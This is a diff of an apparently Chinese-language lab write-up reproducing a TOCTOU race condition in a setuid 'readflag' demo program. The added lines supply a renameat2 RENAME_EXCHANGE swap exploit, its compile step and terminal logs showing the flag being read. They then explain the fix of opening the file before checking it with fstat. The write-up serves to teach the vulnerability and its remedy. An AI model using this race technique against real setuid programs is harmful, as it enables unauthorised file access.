@@ -2,7 +2,7 @@
 
 看到了 liveoverflow 的一个视频，提到 [TOCTOU](https://cwe.mitre.org/data/definitions/367.html) ，所以打算复现一下
 
-via: 
+via: https://www.youtube.com/watch?v=5g137gsB9Wk
 
 demo 代码：
 
@@ -90,7 +90,7 @@ $ ls -l /tmp/readflag
 
 这个检查，检查了文件的 st_uid ，flag 文件的所有者是 `root`，所以 `readflag` 即使带了 `s` 权限，还是读取不了 `flag` 的内容
 
-可以看 `man 2 stat` 中 对 `stat` 结构的描述，这个检查的意思是检查 所有者的 id 是不是 0 （也就是是不是 root，这个毋庸置疑，flag 文件的所有者肯定是 root）
+可以看 `man 2 stat` 中 对 `stat` 结构的描述，这个检查的意思是检查文件所有者的 `uid` 是不是 `0` （也就是是不是 `root`，这个毋庸置疑，`flag` 文件的所有者肯定是 `root`）
 
 ```c
 struct stat {
@@ -139,12 +139,14 @@ lrwxrwxrwx 1 r00t r00t 5  6月 25 23:30 /tmp/flag -> /flag
 看到这个链接的所有者是 `r00t`  （我系统上的一个普通用户），试试看通过 软链接 去读取文件
 
 ```bash
-# r00t @ FakeArch in ~/code/sec/toctou [0:06:22] C:1
+# r00t @ FakeArch in /tmp [0:06:22] C:1
 $ ./readflag /tmp/flag
 Failed to stat /tmp/flag: Permission denied
 ```
 
-其实，如果你读过 `Linux` 内核关于获取文件 `uid` 部分的源码，你就知道这个方法是行不通的
+不行。。。。
+
+
 
 再次审计代码
 
@@ -166,13 +168,47 @@ Failed to stat /tmp/flag: Permission denied
 
 这个写法存在一个 条件竞争(Race condition) 的漏洞
 
-用的是 stat 函数，通过文件名去获取文件的 stat 结构，然后再判断文件的所有者，如果所有者不是 root 的话就打开它，这里从获取文件 stat 到读取并不是原子性操作。
+这里用的是 `stat` 函数，通过文件名去获取文件的 `stat` 结构，然后再判断文件的所有者，如果所有者不是 `root` 的话就打开它，这里从获取文件 `stat` 到读取并不是一步就能完成的，这两个操作有一定的时间差。
 
-假设现在传入的是 `/tmp/A` 文件（`st_uid=1000`），它的所有者是 `hacker(uid=1000)`，在执行完 `stat(argv[1], &stat_data)` 之后的那一个瞬间，我用另一个程序把 `/tmp/flag` （ /flag 的软链接 `st_uid=1000`） 重命名为 `/tmp/A`  这样的话，在 `if` 的检测中检查的是原本的那个 A 文件的 `st_uid`，而走到 `open` 的时候 argv[1] 虽然也是 `/tmp/A` 但是打开的却是原本的 `/tmp/flag` 文件，而这个文件是 `/flag` 的软链接，这样我们就能读出 `/flag` 的内容
+假设现在传入的是 `/tmp/A` 文件（`st_uid=1000`），它的所有者是 `hacker(uid=1000)`，在执行完 `stat(argv[1], &stat_data)` 之后的那一个瞬间，我用另一个程序把 `/tmp/flag` （ `/flag` 的软链接 `st_uid=1000`） 重命名为 `/tmp/A`  这样的话，在 `if` 的检测中检查的是原本的那个 A 文件的 `st_uid`，而走到 `open` 的时候 argv[1] 虽然也是 `/tmp/A` 但是打开的却是原本的 `/tmp/flag` 文件，而这个文件是 `/flag` 的软链接，这样我们就能读出 `/flag` 的内容
 
-这个需要很快去操作，把上面的 /tmp/flag （因为我们是普通用户不能直接操作 flag 文件，所以我们需要一个指向它的链接） 换成 /tmp/A
+这个需要很快去操作，把上面的 `/tmp/flag` （因为我们是普通用户不能直接操作 `flag` 文件，所以我们需要一个指向它的链接） 换成 `/tmp/A`
+
+这里的 `exp` 是 https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
+
+```c
+syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+```
+
+`renameat2` 系统调用
+
+很重要的参数：`RENAME_EXCHANGE `
+
+是交换文件名，原子性操作
+
+man 手册里的描述
+
+       RENAME_EXCHANGE
+              Atomically  exchange  oldpath  and newpath.  Both pathnames must
+              exist but may be of different types (e.g., one could be  a  non-
+              empty directory and the other a symbolic link).
 
 
+现在在 /tmp  目录下有三个文件
+
+A：空文件
+
+flag：根目录下面的 flag 文件的软连接
+
+readflag：上面源码编译出来的 可执行文件（所有者：root，有 s 权限）
+
+```bash
+# r00t @ FakeArch in /tmp [13:34:57] 
+$ ls -li A flag readflag
+43007 -rw-r--r-- 1 r00t r00t     0  6月 26 13:33 A
+54370 lrwxrwxrwx 1 r00t r00t     5  6月 26 13:33 flag -> /flag
+45584 -rwsr-sr-x 1 root root 17096  6月 26 13:32 readflag
+```
 
 
 
@@ -196,7 +232,111 @@ int main(int argc, char *argv[]) {
 }
 ```
 
+编译 exp
 
+```c
+gcc exp.c -o exp
+```
+
+
+
+ 开始：
+
+```bash
+# r00t @ FakeArch in ~ [13:38:30] 
+$ ./exp /tmp/flag /tmp/A
+
+```
+
+
+
+可以看到，/tmp/A 和 /tmp/flag 的 inode 一直在变
+
+```bash
+# r00t @ FakeArch in /tmp [13:44:07] C:2
+$ ls -li A flag readflag
+ls: 无法读取符号链接'A': 无效的参数
+54370 lrwxrwxrwx 1 r00t r00t     5  6月 26 13:33 A
+43007 -rw-r--r-- 1 r00t r00t     0  6月 26 13:33 flag
+45584 -rwsr-sr-x 1 root root 17096  6月 26 13:32 readflag
+
+# r00t @ FakeArch in /tmp [13:44:08] C:2
+$ ls -li A flag readflag
+54370 lrwxrwxrwx 1 r00t r00t     5  6月 26 13:33 A -> /flag
+43007 -rw-r--r-- 1 r00t r00t     0  6月 26 13:33 flag
+45584 -rwsr-sr-x 1 root root 17096  6月 26 13:32 readflag
+
+# r00t @ FakeArch in /tmp [13:44:08] 
+$ ls -li A flag readflag
+ls: 无法读取符号链接'A': 无效的参数
+54370 lrwxrwxrwx 1 r00t r00t     5  6月 26 13:33 A
+43007 -rw-r--r-- 1 r00t r00t     0  6月 26 13:33 flag
+45584 -rwsr-sr-x 1 root root 17096  6月 26 13:32 readflag
+
+# r00t @ FakeArch in /tmp [13:44:09] C:2
+$ ls -li A flag readflag
+ls: 无法读取符号链接'A': 无效的参数
+54370 lrwxrwxrwx 1 r00t r00t     5  6月 26 13:33 A
+43007 -rw-r--r-- 1 r00t r00t     0  6月 26 13:33 flag
+45584 -rwsr-sr-x 1 root root 17096  6月 26 13:32 readflag
+
+# r00t @ FakeArch in /tmp [13:44:09] C:2
+$ ls -li A flag readflag
+ls: 无法读取符号链接'A': 无效的参数
+ls: 无法读取符号链接'flag': 无效的参数
+54370 lrwxrwxrwx 1 r00t r00t     5  6月 26 13:33 A
+54370 lrwxrwxrwx 1 r00t r00t     5  6月 26 13:33 flag
+45584 -rwsr-sr-x 1 root root 17096  6月 26 13:32 readflag
+
+# r00t @ FakeArch in /tmp [13:44:10] C:2
+$ ls -li A flag readflag
+43007 -rw-r--r-- 1 r00t r00t     0  6月 26 13:33 A
+43007 -rw-r--r-- 1 r00t r00t     0  6月 26 13:33 flag
+45584 -rwsr-sr-x 1 root root 17096  6月 26 13:32 readflag
+
+# r00t @ FakeArch in /tmp [13:44:10] 
+$ ls -li A flag readflag
+ls: 无法读取符号链接'A': 无效的参数
+54370 lrwxrwxrwx 1 r00t r00t     5  6月 26 13:33 A
+43007 -rw-r--r-- 1 r00t r00t     0  6月 26 13:33 flag
+45584 -rwsr-sr-x 1 root root 17096  6月 26 13:32 readflag
+
+# r00t @ FakeArch in /tmp [13:44:11] C:2
+$ ls -li A flag readflag
+ls: 无法读取符号链接'flag': 无效的参数
+43007 -rw-r--r-- 1 r00t r00t     0  6月 26 13:33 A
+54370 lrwxrwxrwx 1 r00t r00t     5  6月 26 13:33 flag
+45584 -rwsr-sr-x 1 root root 17096  6月 26 13:32 readflag
+```
+
+现在试试看读取 flag
+
+```bash
+# r00t @ FakeArch in /tmp [13:45:34] 
+$ ./readflag /tmp/flag
+File /tmp/flag is owned by root
+
+# r00t @ FakeArch in /tmp [13:45:35] C:1
+$ ./readflag /tmp/flag
+File /tmp/flag is owned by root
+
+# r00t @ FakeArch in /tmp [13:45:36] C:1
+$ ./readflag /tmp/flag
+
+# r00t @ FakeArch in /tmp [13:45:36] 
+$ ./readflag /tmp/flag
+File /tmp/flag is owned by root
+
+# r00t @ FakeArch in /tmp [13:45:37] C:1
+$ ./readflag /tmp/flag
+File /tmp/flag is owned by root
+
+# r00t @ FakeArch in /tmp [13:45:37] C:1
+$ ./readflag /tmp/flag
+flag{y0u_get_1t}
+```
+
+我在第六次的时候成功读取 flag 的内容
 
 
 
@@ -249,3 +389,50 @@ int main(int argc, char* argv[]) {
 }
 ```
 
+修复后的代码其实就是先打开文件，然后通过文件描述符去获取文件的 信息
+
+这样就不存在文件名变更的问题了
+
+举个例子吧
+
+```bash
+# r00t @ FakeArch in /tmp/demo [14:14:03] 
+$ ls -i
+173774 test
+
+# r00t @ FakeArch in /tmp/demo [14:14:05] 
+$ mv test test1 
+
+# r00t @ FakeArch in /tmp/demo [14:14:21] 
+$ ls -i
+173774 test1
+```
+
+看到了吗，修改文件名其实影响不了文件的 `inode` ，在内核里面判断一个文件并不是依靠文件名
+
+可以看看 `open` 和 `read` 在 内核里面的实现
+
+ 所以，先是用 `open` 打开文件，再通过文件文件描述符去获取文件 `stat` 结构，修改文件名是无效的，更直观一点的演示
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+
+int main()
+{
+  int f = open("/tmp/demo/test", O_RDONLY);
+  system("ls -l /proc/self/fd");
+  getchar();
+  system("ls -l /proc/self/fd");
+  return 0;
+}
+```
+
+![](demo.png)
+
+在 `demo` 运行到 `getchar()` 的时候我修改了 `test` 文件的文件名，修改后再查看 `/proc/self/fd` 的时候原本文件描述符 `3` 是指向 `test` 文件的，修改文件名后变成了指向修改后的文件名
+
+直接看 liveoverflow 的视频演示：https://www.youtube.com/watch?v=1hScemFvnzw
+
+溜～
